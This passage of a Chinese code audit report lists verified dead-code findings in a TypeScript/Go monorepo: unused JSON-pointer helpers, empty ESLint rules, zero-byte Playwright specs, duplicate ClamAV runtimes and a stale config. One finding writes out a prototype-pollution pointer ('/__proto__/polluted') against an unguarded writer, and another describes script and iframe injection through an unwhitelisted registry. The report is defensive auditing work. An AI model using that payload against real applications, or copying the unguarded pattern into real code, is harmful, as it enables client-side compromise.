**失败场景**: 运维人员在一个已被占用的端口上启动该服务。ListenAndServe 返回 "address already in use";`log.Fatal` 触发,而 `server.Close()`——它会调用 `CloseMaintenance()` 和 `db.Close()`——被静默跳过,因此它本应输出的日志行 "close database: ..." 永远不会出现。在滚动发布中,SIGTERM 会在请求处理中途杀死进程:进行中的 POST /api/workspaces/:id/operations/commit 连接被重置,没有任何排空窗口,而两个维护 goroutine 会在数据库事务中途被撕毁,而不是经由各自的 Close()/context 取消路径退出。

**修复建议**: 用显式的 `http.Server` 替换 `router.Run`,在 goroutine 中运行 `ListenAndServe`,等待 `signal.NotifyContext(ctx, os.Interrupt, syscall.SIGTERM)`,然后调用 `srv.Shutdown(drainCtx)`,再调用 `server.Close()`。把 `log.Fatal(runErr)` 换成显式清理加 `os.Exit`,使关闭流程始终执行。

**验证备注**: 对 Go 语义的解读是正确的。server.Run()(server.go:77-80)返回 router.Run(addr) -> http.ListenAndServe,后者永远不会返回 nil;也没有任何地方持有 *http.Server 引用以调用 Shutdown/Close,因此 runErr 恒为非 nil,log.Fatal 调用 os.Exit(1),而 os.Exit 不执行 defer 函数——main.go:19 的 defer 在每条路径上都不可达,使 Server.Close()(它会调用 CloseMaintenance() 和 db.Close())成为死代码。git grep 确认 apps/backend 之下任何位置都没有 signal.Notify,也没有 http.Server{} 的构造,因此不存在优雅关闭。严重级别由 medium 下调为 low:实际影响有限,因为进程退出无论如何都会关闭连接池中的套接字,Postgres 也会回滚任何未提交的事务,所以不会丢失或损坏数据;真正的缺口是缺少针对进行中请求的 SIGTERM 排空窗口,这属于运维加固事项而非正确性缺陷。

##### L-DC-07 workspace-sync 中五个导出的 JSON pointer 辅助函数是死代码,其中包含一个具有原型污染形态的写入函数

- **位置**: [`packages/workspace-sync/src/jsonValue.ts:227`](packages/workspace-sync/src/jsonValue.ts#L227)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `valueStatesEqual`(第 162 行)、`readJsonPointer`(185)、`commonJsonPointerAncestor`(201)、`jsonPointersOverlap`(218)和 `writeJsonPointer`(227)都从 `jsonValue.ts` 导出,却无处被引用 —— `jsonValue.ts` 内部没有引用,`packages/workspace-sync` 中其他模块也没有引用;而且 `jsonValue.ts` 并未从 `src/index.ts` 再导出,因此它们也不属于该包的公共 API。(`packages/data/src/dataCacheRuntime.ts` 有自己本地的 `readJsonPointer`,并不导入这一份。)项目策略禁止无正当理由的重复所有者以及 alpha 阶段的临时代码。`writeJsonPointer` 还带有潜在的原型污染形态 —— `parent[key] = cloneJsonValue(state.value)` 中 `key` 是任意 pointer 片段,因此 `__proto__` 片段会改写 `Object.prototype` —— 目前之所以不可达,仅仅因为该函数是死代码,这反而成了下一个接入者的陷阱。

**失败场景**: 今天没有运行时故障 —— 这些函数不可达。具体代价是维护隐患:未来若有调用方把 `writeJsonPointer` 接到由解码后的 `WorkspacePatchOperation.path` 推导出的 pointer 上(wire codec 位于 workspaceOperationCommitWire.ts:62-83,会欣然解析 `/__proto__/polluted`),就会在整个浏览器会话中设置 `Object.prototype.polluted`,因为该函数没有任何 `__proto__`/`constructor`/`prototype` 片段守卫。

**修复建议**: 删除 `valueStatesEqual`、`readJsonPointer`、`commonJsonPointerAncestor`、`jsonPointersOverlap` 和 `writeJsonPointer`。如果其中某一个是为即将出现的调用方有意保留的,只保留那一个,并在其被使用之前为 `writeJsonPointer` 加上对 `__proto__`/`constructor`/`prototype` 片段的拒绝。

**验证备注**: 已端到端验证。jsonValue.ts:227-247 处所引的 writeJsonPointer 函数体完全吻合。对这五个名称在全仓库执行 `git grep`,只返回它们各自的定义行:valueStatesEqual(162)、readJsonPointer(185,另有 packages/data/src/dataCacheRuntime.ts:199 处一份无关的私有副本)、commonJsonPointerAncestor(201)、jsonPointersOverlap(218)、writeJsonPointer(227) —— 零个调用点。我阅读了每一个导入 './jsonValue' 的模块(workspaceAuthoringDelta、workspaceConflictSession、workspaceResolutionOperation、workspaceSemanticDiff、workspaceThreeWay、workspaceRevisionConflict、workspaceOperationCommitResponseValidation);它们只导入 jsonValuesEqual、cloneJsonValue、isRecord、appendJsonPointer、decodeJsonPointerSegment、semanticJsonValuesEqual、indexStableIdArray、resolveStableIdArrayPair、stableIdArrayPointer。packages/workspace-sync/src/index.ts 中没有对 jsonValue 的再导出,package.json 也只导出 '.' 与 './package.json',因此它们同样不是公共 API。原型污染形态也确实存在:parseJsonPointer 没有做任何 **proto**/constructor/prototype 过滤,对于 '/**proto**/polluted' 这样的 pointer,遍历循环中的 isRecord(child) 检查会通过(Object.prototype 是非数组、非 null 的对象),因此最后的 `parent[key] = ...` 会写到 Object.prototype 上。所声称的 'low' 严重级别是正确的 —— 今天不可达,因此这只是维护性/潜伏陷阱类发现。

##### L-DC-08 有序组件 registry 与 resolver-order 解析是死导出,其 `resolve()` 回退会渲染任意标签名

- **位置**: [`packages/pir-react-renderer/src/host/registry.ts:375`](packages/pir-react-renderer/src/host/registry.ts#L375)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-pir`

**详情**: `createOrderedComponentRegistry`、`parseResolverOrder` 以及两个 registry 工厂上的 `resolve()` 方法都从 `src/index.ts` 导出,但在整个仓库(生产代码或测试)中没有任何调用点。唯一的消费方 `apps/web/src/pir/pirWebRendererHost.tsx:109` 使用的是 `registry?.get(type) ?? defaultComponentRegistry.get(type)` 加上它自己的 `HTML_ELEMENTS` 白名单;`createComponentRegistry` 也只通过 `createRendererProjectionRegistry` 被触及。除了在一个禁止无正当理由重复所有者的 alpha 代码库中属于冗余负担之外,`resolve()` 还带有潜在隐患:对*任何*全小写字符串它都会返回 `component: type as React.ElementType`,也就是绕过了 `pirWebRendererHost` 刻意执行的白名单。

**失败场景**: 如果 `resolve()` 曾被接入宿主(它就在 `get()` 旁边,看起来像是理所当然的 API),那么一个带有 `{ kind:'element', type:'iframe' }` 或 `type:'script'` 的 PIR 文档就会解析为该原始标签,并把作者可控的 props 展开到它上面 —— React 会创建并挂载该元素,于是带文本子节点的 `<script>` 会执行,`<iframe src=...>` 会加载攻击者内容,从而击穿 `pirWebRendererHost` 中的 `HTML_ELEMENTS` 白名单。目前这段代码只是不可达且未被测试。

**修复建议**: 删除 `createOrderedComponentRegistry`、`parseResolverOrder`、`DEFAULT_RESOLVER_ORDER`、`resolve` 方法以及 `RegistryGroup` / `ResolvedComponent` 类型导出,把 `ComponentRegistry` 收窄为 `{ register, get }`(这正是 `createRendererProjectionRegistry` 和 `createPirWebRendererHost` 用到的全部)。如果确实计划支持分层解析,请在 web 宿主所执行的同一套显式元素白名单之后再重新引入。

**验证备注**: 尝试反驳但在事实核心上无法推翻。(1)证据与源码完全一致:packages/pir-react-renderer/src/host/registry.ts:375 定义了 `createOrderedComponentRegistry(order = DEFAULT_RESOLVER_ORDER, customRegistry?)`,其 `resolve()`(第 402 行)包含所引用的 `if (group === 'native' && type && type.toLowerCase() === type) { return { type, component: type as React.ElementType, adapter: htmlAdapter } }` 代码块,并在循环之后还有第二个同样无守卫的小写回退。(2)死导出的说法在仓库范围内得到验证:对全部 3009 个被跟踪文件执行 `git grep`,`createOrderedComponentRegistry` 和 `parseResolverOrder` 只出现在各自定义处(registry.ts:350、375)和 barrel 再导出处(src/index.ts:25、27)—— 生产代码和测试中的调用点均为零。`.resolve(` 在全仓库只有两处命中(host/iconRegistry.ts:290、317),都属于无关的图标 provider;不存在解构或动态访问 `resolve` 的写法。registry.ts 根本没有测试文件。(3)registry.ts:370-373 的陈旧 JSDoc 宣称存在一条“设置 resolverOrder -> parseResolverOrder -> createOrderedComponentRegistry”的链路,而它并不存在:`resolverOrder` 只作为孤立的 i18n 键出现在 en/zh-CN editor.json:1069 中,SettingsDefaults.ts 里没有对应条目,GlobalSettingsPanels.tsx 里也没有对应行(对比同类的 `panInertia`,它在 store、defaults、面板和 canvas 中都完整接线)。(4)唯一存活的路径与描述一致:apps/web/src/pir/pirWebRendererHost.tsx:109 使用 `registry?.get(type) ?? defaultComponentRegistry.get(type)`,并回退到它自己的 HTML_ELEMENTS 白名单;它甚至把参数类型标注为 `Pick<ComponentRegistry,'get'>`,因此 `resolve` 在结构上被排除在宿主契约之外。`createComponentRegistry` 本身**并非**死代码(被 extensionQueryService.tsx:248 和 pirWebRendererHost.test.tsx 使用),但它的 `resolve` 方法是。严重级别修正理由:审查者的安全失败场景**不是**缺陷 —— 它明确以未来的修改为前提(“如果 resolve() 曾被接入宿主”),在今天的任何生产路径上都不可达,而且 PIR 文档是用户在自己的画布中编写的,因此 HTML_ELEMENTS 集合是一种组合选择而非声明的信任边界。该定性没有分量。真正成立的是:在一个禁止无正当理由残留物的代码库中存在一处经核实的未接线特性/死导出,外加一段误导性的文档注释 —— 恰好是 'low'。

##### L-DC-09 resolveTimelineCursorMs 中不可达的 infinite 迭代分支(与实际生效路径语义不同的死代码)

- **位置**: [`packages/animation/src/animationEvaluation.ts:176`](packages/animation/src/animationEvaluation.ts#L176)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-domain-misc`

**详情**: 当 `timeline.iterations === 'infinite'` 时,第 167 行会把 `totalDurationMs` 设为 `Number.POSITIVE_INFINITY`。因此第 175 行的守卫 `if (elapsedMs >= totalDurationMs)` 对任何有限的 `elapsedMs` 都永远不可能为真,第 176-182 行整个 `if (iterations === 'infinite') { ... }` 块都不可达。infinite timeline 实际上由第 190-199 行的贯穿路径处理——packages/animation/src/animation.property.test.ts:197-208 正是在验证这条路径。这个死代码块也不是生效路径的副本:它在计算循环游标时完全没有应用 `timeline.easing`,因此日后若有人“修复”这个守卫,就会静默改变 infinite timeline 的 easing 行为。

**失败场景**: 今天没有运行时错误行为,但这段代码对任何输入都不可达:在 `iterations: 'infinite'` 和任意有限 `globalMs` 下,`elapsedMs >= Infinity` 为 false,因此第 176-182 行永不执行。阅读该函数的维护者会以为 infinite 播放在那里处理,并认为对 infinite timeline 刻意跳过了 timeline easing,而这与第 192-199 行的实际行为恰恰相反。

**修复建议**: 删除第 176-182 行,让贯穿路径独自负责 infinite timeline;或者加一条注释,明确说明这种情况下 `totalDurationMs` 就是 Infinity。

**验证备注**: 已阅读 packages/animation/src/animationEvaluation.ts:153-200;引用的证据与第 175-182 行完全吻合。当 timeline.iterations === 'infinite' 时,第 165-168 行将 totalDurationMs 设为 Number.POSITIVE_INFINITY,因此第 175 行的守卫 `elapsedMs >= totalDurationMs` 对每个有限的 elapsedMs 都为 false,使第 176-182 行不可达。通过 git grep 追踪了所有调用方:animationEvaluation.ts:332 传入 Math.max(0, globalMs),animationPlayback.ts:141 传入 lastElapsedMs,而后者只在 animationPlayback.ts:128 处显式的 `if (!Number.isFinite(timestampMs))` 提前退出之后才被派生——因此在生产中 elapsedMs 始终有限。infinite timeline 确实由第 190-199 行的贯穿路径服务,animation.property.test.ts:180-212(iterations: 'infinite')正是在验证这条路径。该死代码块在语义上也与生效路径不同:它从不应用 timeline.easing(而第 192-196 行会应用)。即便是唯一在理论上能满足条件的输入(elapsedMs === Infinity)也会返回 NaN,因为 Infinity % durationMs 是 NaN,这进一步说明该分支从未被执行过。确属死代码,今天没有运行时影响——low 是正确的。

##### L-DC-10 两条已发布的 ESLint 规则从不调用 context.report,因此 `prodivix/no-circular` 和 `prodivix/no-type-error` 必然产生漏报

- **位置**: [`packages/eslint-plugin-prodivix/src/rules/no-circular.ts:15`](packages/eslint-plugin-prodivix/src/rules/no-circular.ts#L15)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-domain-misc`

**详情**: `no-circular.create()` 返回一个空的监听器对象,`no-type-error.create()` 返回的 `CallExpression` / `BinaryExpression` 处理函数体内只有注释。两条规则都不可能发出诊断,却都声明了 `meta.messages` 并注册在已发布的插件中(`packages/eslint-plugin-prodivix/src/index.ts:12-14`)。该包的 `test` 脚本是 `echo "No tests for eslint-plugin-prodivix" && exit 0`,因此 `pnpm test` 对此提供零覆盖,不可能暴露这个问题。在一个禁止临时补丁、禁止同一语义存在重复/空实现所有者的 alpha 代码库中,这是两个宣称提供项目并不具备的静态分析保证的死生产模块。

**失败场景**: 任何启用 `prodivix/no-circular`(文档描述为“检测 PIR 模块中的循环依赖”)的使用方,在包含真实导入环的代码库上都会得到干净的 lint 结果,因为 `create()` 根本没有订阅任何 AST 节点。`prodivix/no-type-error` 对任何 PIR 类型不匹配也是如此。

**修复建议**: 要么从 `src/index.ts` 中删除这两条规则及其注册,要么实现它们,并补上规则测试(RuleTester)以及该包真正的 `test` 脚本。

**验证备注**: 完整阅读了 packages/eslint-plugin-prodivix/src/rules/no-circular.ts:第 14-16 行是 `create(): Rule.RuleListener { return {}; }`——引用证据逐字吻合,它不订阅任何 AST 节点,因此尽管声明了 meta.messages.circular,context.report 也永远不会触发。阅读了 no-type-error.ts:create() 返回 CallExpression(第 17-20 行)和 BinaryExpression(第 22-24 行)处理函数,函数体内只有中文注释,没有 report 调用。两者都注册在 src/index.ts:12-14('no-circular': noCircular, 'no-type-error': noTypeError)。package.json:13 确认 `"test": "echo \"No tests for eslint-plugin-prodivix\" && exit 0"`,因此根级 pnpm test 提供零覆盖。一处不改变结论的范围修正:两条空规则都不在 configs.recommended 中(index.ts:16-23 只以 warn 启用 prodivix/no-unused-var),且 git grep 显示仓库中没有任何 eslint 配置(.eslintrc.cjs、apps/cli|vscode|web/eslint.config.*)使用该插件——因此影响仅限于已发布包的外部使用方。这是宣称提供并不存在的保证的死生产模块;low 是站得住脚的严重级别。

##### L-DC-11 心跳失败分支是死代码:错误被捕获却从未被处理

- **位置**: [`apps/remote-runner-worker/src/workerAgent.ts:861`](apps/remote-runner-worker/src/workerAgent.ts#L861)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: `heartbeatFailure` 在心跳的 `.catch` 中赋值(第 168 行),只在 `finally` 里一个空的 `if` 块中被读取。该块没有任何语句,因此这个变量对控制流、状态或 `pollOnce` 的返回值都没有可观察的影响。任何审查 lease 丢失路径的读者看到的都是一个什么也不做的守卫,而它得以存活的唯一原因是一个禁用了 `no-empty` 的 linter。

**失败场景**: control plane 故障导致 `renew()` 拒绝。`heartbeatFailure` 被置位,`abort.abort('heartbeat-failed')` 触发;随后 `finally` 求值 `if (heartbeatFailure)` 却什么都不执行。这个失败从未被呈现出来(没有日志、没有诊断、没有不同的返回值),因此排查执行卡死的运维人员没有任何信号能判断 lease 被放弃是因为心跳失败,还是因为 control plane 撤销了它。

**修复建议**: 要么彻底删除 `heartbeatFailure` 和那个空分支(`abort.abort('heartbeat-failed')` 已经承载了语义),要么让该分支做点可观察的事,例如把原因暴露给调用方,让 `main.ts` 可以退避。

**验证备注**: 引用的证据与 workerAgent.ts:855-863 逐字吻合。grep 显示 `heartbeatFailure` 只有三处引用:第 146 行的声明、第 168 行心跳 `.catch` 内唯一的一次写入,以及第 861 行的读取——而该处块体内只有一条注释。因此这个变量对控制流、状态和 pollOnce 的返回值都没有影响,它确实是死的。所述的故障场景同样成立:在 `abort.abort('heartbeat-failed')` 之后,流程到达第 368 行的 `if (abort.signal.aborted)`,`cancellationRequested` 为 false,于是返回 true,没有状态转换、没有日志、没有不同的返回值,因此心跳失败与 control plane 撤销无法区分。对审查者理由的一处更正:ESLint 的 `no-empty` 默认会忽略含注释的块,因此让它通过 lint 的是那条注释,而不是被禁用的规则。没有任何运行时或安全影响;所声称的 low 严重级别本就正确,予以维持。

##### L-DC-12 Asset Delivery Host 仍然随包发布两个已被取代、生产不可达的扫描器/变换组合所有者

- **位置**: [`apps/asset-delivery-host/src/clamAvDaemonReadiness.ts:301`](apps/asset-delivery-host/src/clamAvDaemonReadiness.ts#L301)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-cp-hosts`

**详情**: `initializeClamAvDaemonRuntime`(连同其 `ClamAvDaemonReadinessGate` / `InitializedClamAvDaemonRuntime` 类型)是 ClamAV 策略锁定与就绪缓存的第二个所有者,与 `clamAvScannerFleet.ts` 中的 `initializeClamAvScannerFleetRuntime` 重复。`git grep` 显示它唯一的导入方是 `clamAvDaemonReadiness.test.ts`;`src/main.ts` 和 `scripts/verify-clamav-gate.ts` 都不使用它(两者都只通过 fleet 间接使用 `probeClamAvDaemon`)。同样的模式在 `assetDeliveryHttpHandler.ts` 中重演:`transformer`(单数)、`scanners` 和 `scannerReadiness` 选项以及 `createStaticAssetDeliveryScannerRuntime` 只被测试用到,而 `/internal/png-transform-delivery-sessions` 路由(assetDeliveryHttpHandler.ts:368,及其第 401-419 行和 212-214 行的 `legacyPngTransform` 特例处理)没有任何调用方——`apps/backend/internal/modules/workspace/handlers_asset_delivery.go:225-227` 中的 Go 后端只会选择 `/internal/delivery-sessions` 或 `/internal/image-transform-delivery-sessions`。本项目处于 alpha 阶段,并明确不允许没有正当理由的兼容垫片和同一语义的重复所有者。

**失败场景**: 一位维护者为加固恶意软件闸门而修补 `initializeClamAvDaemonRuntime` 的 `assertReady` 策略漂移检查(clamAvDaemonReadiness.ts:329),以为它守护着生产,其测试也通过——但部署的 Host 组合的是 `initializeClamAvScannerFleetRuntime`,后者独立的漂移逻辑位于 `selectEnginePolicy` 中且未被改动,因此这次加固根本没有到达生产。对称地,未被触及的 `legacyPngTransform` 分支让一条接受空 `X-Prodivix-Delivery-Disposition`(第 415 行)的投递路径继续存活——这是一项当前没有任何调用方需要、也没有任何生产测试覆盖的放宽。

**修复建议**: 删除 `initializeClamAvDaemonRuntime` 及其现已无用的类型/测试(保留共享的 `probeClamAvDaemon`),去掉 `transformer`/`scanners`/`scannerReadiness` 选项以及 `createStaticAssetDeliveryScannerRuntime`,并移除 `/internal/png-transform-delivery-sessions` 路由和 `legacyPngTransform` 分支,把受影响的测试迁移到 `scannerRuntime`/`transformers` 和 `/internal/image-transform-delivery-sessions` 上。

**验证备注**: 已逐行核对。clamAvDaemonReadiness.ts:300-303 与引用证据完全吻合。跨仓库 git grep 显示 initializeClamAvDaemonRuntime 唯一的导入方是 clamAvDaemonReadiness.test.ts(第 4、94、115、130、148、158、168 行);apps/asset-delivery-host/src/main.ts:11,51 和 scripts/verify-clamav-gate.ts:10,58 组合的都是 initializeClamAvScannerFleetRuntime,而 fleet 只复用了共享的 probeClamAvDaemon(clamAvScannerFleet.ts:13,360)。重复所有者的定性成立:daemon 运行时的策略锁 + 就绪缓存 + 漂移检查位于其 assertReady 闭包中(第 319-341 行),而 fleet 在 selectEnginePolicy(clamAvScannerFleet.ts:243-282)中独立重新实现了漂移检查,并在 356-420 处有自己的缓存/刷新——因此加固其中一个不会改变另一个。handler 这一半也核实无误:assetDeliveryHttpHandler.ts:368 注册了 /internal/png-transform-delivery-sessions,legacyPngTransform 的特例处理位于 401-419(包括第 415 行的空 disposition 放宽)和 212-214;单数的 `transformer`、`scanners`、`scannerReadiness` 选项(第 40-45、261-291 行)以及 createStaticAssetDeliveryScannerRuntime 只在 assetDeliveryHttpHandler.test.ts 中被用到。git grep 确认唯一的非测试调用方 apps/backend/internal/modules/workspace/handlers_asset_delivery.go:225-227 只选择 /internal/delivery-sessions 或 /internal/image-transform-delivery-sessions,因此该 png 路由及其放宽的 disposition 分支在生产中不可达。这属于死代码/重复所有权,而非活跃缺陷,因此 'low' 是正确的严重级别。

##### L-DC-13 generate-tailwind4-catalog.mjs 写入的路径并不存在,也没有任何脚本引用它 —— 属于死工具代码

- **位置**: [`scripts/generate-tailwind4-catalog.mjs:6`](scripts/generate-tailwind4-catalog.mjs#L6)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-cli-vscode-scripts`

**详情**: 输出路径 `apps/web/src/editor/features/design/inspector/classProtocol/tailwind4.catalog.json` 并不存在;编辑器实际消费的目录是 `apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/tailwind4.catalog.json`。`git grep generate-tailwind4-catalog` 找不到任何 package.json 脚本或其他调用方,因此该文件从任何受支持的命令都不可达,也无法重新生成已提交的 catalog。

**失败场景**: 某位开发者在升级 Tailwind 后需要刷新 Tailwind 4 类目录,于是运行 `node scripts/generate-tailwind4-catalog.mjs`:`fs.writeFile` 会在 `.../features/design/inspector/classProtocol/tailwind4.catalog.json` 上以 ENOENT 拒绝。由于没有任何可用命令能重新生成 `tailwind4.catalog.json`,编辑器的类协议会静默停留在陈旧的 4.1.18 快照上。

**修复建议**: 把 `outputPath` 指向真正的消费方目录(`features/blueprint/editor/inspector/components/classProtocol/`),通过 `import.meta.url` 解析仓库根目录,并把该脚本接入 package.json —— 或者,如果运行时快照生成器已经取代了它,就直接删除。

**验证备注**: 证据与 scripts/generate-tailwind4-catalog.mjs:6-17 原样一致。`ls apps/web/src/editor/features/` 返回 animation、blueprint、code、component、development、execution、export、issues、newfile、resources、revisionConflict、settings、testing —— 不存在 `design` 目录,因此 outputPath 的父目录不存在,第 61 行的 fs.writeFile 会以 ENOENT 拒绝(writeFile 不会执行 mkdir -p)。`git ls-files | grep tailwind4.catalog` 显示唯一真实的 catalog 是 apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/tailwind4.catalog.json,由 apps/web/src/editor/features/blueprint/editor/inspector/components/classProtocol/engines/tailwind4ClassEngine.ts:2 消费。`git grep -rn generate-tailwind4-catalog` 只返回脚本自身(其他任何匹配都会以 exit 1 结束),而在 package.json / apps/web/package.json 中检索 'tailwind' 表明唯一被接入的生成器是与之无关的 scripts/generate-tailwind-runtime-snapshot.mjs(根 package.json:112、apps/web/package.json:11)。第 56 行硬编码的 `tailwindVersion: '4.1.18'` 与 apps/web/package.json:117 中声明的 tailwindcss `^4.3.2` 相互印证:自依赖升级以来该脚本从未被运行过。low 严重程度是正确的:这是不可达的工具代码,没有运行时或生产影响。

##### L-DC-14 `@prodivix/eslint` 的 test 脚本是 `echo … && exit 0`,而它注册的三条规则中有两条从不报告

- **位置**: [`packages/eslint-plugin-prodivix/src/rules/no-circular.ts:15`](packages/eslint-plugin-prodivix/src/rules/no-circular.ts#L15)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `turbo run test`(即 .github/workflows/tests.yml:1686 中的 `Test workspaces without web` 步骤)会运行该包的 `test` 脚本,而该脚本被硬编码为 exit 0 —— 这是一道不可能失败的守卫。真正的运行器是 `test:run`(`vitest run`),但没有任何地方调用它,而且该包根本没有任何测试文件。另外,`src/rules/no-circular.ts:15` 返回一个空的 listener 对象,`src/rules/no-type-error.ts` 中的 `CallExpression`/`BinaryExpression` 处理函数体内只有注释;两者都从不调用 `context.report`,却都以 `meta.type: 'problem'` 和声明好的消息模板从 `src/index.ts:13-15` 作为正式规则导出。

**失败场景**: 启用了 `prodivix/no-circular` 或 `prodivix/no-type-error`(两者都作为生产规则导出)的使用方会得到一个静默通过的检查:循环的 PIR 模块图和 PIR 类型不匹配从不会被报告,而配置却声称这些规则处于启用状态。该包自身的 `turbo run test` 调用在 CI 中报告成功却执行了零条断言,因此这种空壳状态从未被暴露。

**修复建议**: 如果该包没有被使用(仓库中没有任何 ESLint 配置引用它),就删除未实现的规则以及整个包;否则实现它们,并把 `echo … && exit 0` 的 test 脚本换成 `vitest run`,让 turbo 的 `test` 守卫真正具备失败能力。

**验证备注**: 所有引用的代码均已按原样核实:packages/eslint-plugin-prodivix/package.json:13 是 `"test": "echo ... && exit 0"`,src/rules/no-circular.ts:15 是 `create(): Rule.RuleListener { return {}; }`,src/rules/no-type-error.ts 的 CallExpression/BinaryExpression 处理函数中只有中文注释。`git ls-files packages/eslint-plugin-prodivix` 只返回 package.json、tsconfig.json、vitest.config.ts 以及三个规则源文件加 index.ts —— 零个测试文件,因此 `test:run`(vitest run)确实无人引用。严重程度下调为 low,基于审查者遗漏的三点:(1)`git grep '@prodivix/eslint|eslint-plugin-prodivix'` 只匹配到该包自身的 package.json 和 index.ts —— 仓库中没有任何东西依赖、扩展或发布这个插件,在 .github/workflows/npm-packages.yml 中检索 'eslint' 也没有结果,因此所谓的“使用方”纯属外部/假设情形;(2)插件自身的 configs.recommended(src/index.ts:18-22)只启用了 'prodivix/no-unused-var',即唯一被完整实现的那条规则 —— 两个空壳规则只能显式选用;(3)`"test": "echo ... && exit 0"` 是全仓库通用的占位约定,apps/docs/package.json:7、apps/vscode/package.json:54 和 packages/vscode-debugger/package.json:9 同样如此,因此把它称作独一无二的“不可能失败的守卫”是被夸大了。两处引用错误:.github/workflows/tests.yml 总共只有 69 行('Test workspaces without web' 步骤在 :44-45,而非 :1686),规则导出位于 src/index.ts:12-14,而非 13-15。留存下来的缺陷 —— 两条导出的 meta.type:'problem' 规则永远不可能调用 context.report —— 是真实的死代码,故以 low 严重程度确认。

##### L-DC-15 四个零字节的 Playwright spec 文件宣称了实际并不存在的 e2e 覆盖

- **位置**: [`tests/e2e/specs/performance.spec.ts:1`](tests/e2e/specs/performance.spec.ts#L1)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `tests/e2e/specs/performance.spec.ts`、`node-state.spec.ts`、`node-diff.spec.ts` 和 `debug-breakpoint.spec.ts` 全都是 0 字节,辅助文件 `tests/e2e/pages/EditorPage.ts` 与 fixture `tests/e2e/fixtures/todo-app.pir.json` 同样如此(仓库中没有任何地方导入这两者)。`tests/e2e/playwright.config.mts` 设置了 `testDir: './specs'` 且没有 `testMatch`,因此 Playwright 会收集这些文件、发现零个测试、什么也不报告 —— 运行结果保持绿色。于是这些被点名的领域(调试器断点、NodeGraph diff、NodeGraph 状态、性能)尽管有专门的 spec 文件存在,却完全没有浏览器覆盖。

**失败场景**: `pnpm run test:e2e` 与 CI 的 `Run Chromium smoke and official plugin conformance` 步骤都会报告成功,而针对断点、node-diff、node-state 和性能行为执行了零条断言;浏览 `tests/e2e/specs` 的审查者会合理地认为这些用户旅程已被守卫,实际上并没有。空的 `todo-app.pir.json` 另外还是任何未来 fixture 加载器潜在的 `JSON.parse` 失败点。

**修复建议**: 删除这些空的 spec/辅助/fixture 文件(git rm),或者把它们实现出来;如果必须保留占位文件,则通过 `testIgnore` 排除,使目录列表不再暗示存在覆盖。

**验证备注**: 每一项事实都已核实。`git ls-files tests/e2e` 加上逐文件的 `wc -c` 显示 tests/e2e/specs/debug-breakpoint.spec.ts、node-diff.spec.ts、node-state.spec.ts、performance.spec.ts 均为 0 字节,tests/e2e/pages/EditorPage.ts 与 tests/e2e/fixtures/todo-app.pir.json 也是 0 字节(非空的同级文件为 smoke.spec.ts 366B、plugin-sandbox.spec.ts 7378B、official-component-plugins.spec.ts 9865B、binary-asset-product-journey.spec.ts 26915B)。在整个仓库执行 `git grep 'EditorPage|todo-app.pir'` 返回零个结果,确认这两个辅助文件均为孤儿。tests/e2e/playwright.config.mts 设置了 `testDir: './specs'` 且没有 testMatch,因此这些空模块会被收集,贡献零个测试且不会报错。严重程度按声明保持 low —— 这是死脚手架,而非功能缺陷。需要指出一处夸大:.github/workflows/smoke.yml:66-67 处的 CI 步骤运行的是 `pnpm run test:e2e:smoke:chromium`,即 `playwright test --grep @smoke`,因此这些空文件在那里无论如何都会被标签过滤掉;“收集它们并发现零个测试”的路径属于根目录的 `test:e2e` 脚本(package.json:79),而非 smoke 作业。

##### L-DC-16 根目录的 `.eslintrc.cjs` 是死配置,在 ESLint 9 flat config 下永远不会被加载

- **位置**: [`.eslintrc.cjs:1`](.eslintrc.cjs#L1)
- **类别**: dead-code ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: 仓库把 `eslint` 锁定在 ^9.39.4(apps/web/package.json),且每个真正被 lint 的包都自带 flat 的 `eslint.config.*`。ESLint 9 会忽略 `.eslintrc.*`,除非设置了 `ESLINT_USE_FLAT_CONFIG=false`,而仓库和工作流中都没有这么做。然而该文件仍声明了一整套规则(`eslint:recommended`、`@typescript-eslint/recommended`、`plugin:react/recommended`、`plugin:react-hooks/recommended`、`plugin:storybook/recommended`、`@typescript-eslint/no-explicit-any: 'error'`),而且最后一次改动来自 `chore(lint): ban explicit any across the codebase`,这让它读起来像是全仓库策略,实际上却什么都没有强制执行。

**失败场景**: 某位贡献者往 `.eslintrc.cjs` 里加了一条规则,期望它在全仓库生效;而 `pnpm run lint` 从不加载该文件,于是这条规则静默失效,评审时却看起来已被强制执行。它还与 `apps/web/eslint.config.js` 相矛盾 —— 后者显式关闭了 `react-hooks/exhaustive-deps`,而该文件的 `plugin:react-hooks/recommended` 会启用它。

**修复建议**: 删除 `.eslintrc.cjs`,并把仍然需要的规则迁移到根目录的 flat `eslint.config.js` 中,由各包配置继承。

